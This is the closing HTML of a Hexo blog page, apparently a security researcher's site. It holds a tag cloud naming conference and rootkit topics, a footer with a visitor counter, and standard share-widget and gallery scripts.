    <a href="/tags/BlackHat/" style="font-size: 10px;">BlackHat</a> <a href="/tags/CanSecWest/" style="font-size: 10px;">CanSecWest</a> <a href="/tags/OSX/" style="font-size: 10px;">OSX</a> <a href="/tags/PHDays/" style="font-size: 10px;">PHDays</a> <a href="/tags/rootkit/" style="font-size: 10px;">rootkit</a>
  </div>
</div>

</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  <p>
  
  &copy; 2016 riusksk
  
  All rights reserved.</p>
  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>，
  <span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
  </span>
  </p>
</div>
<div class="clearfix"></div>

<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
</footer>
  <script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


<div id='bg'></div>
</body>
</html>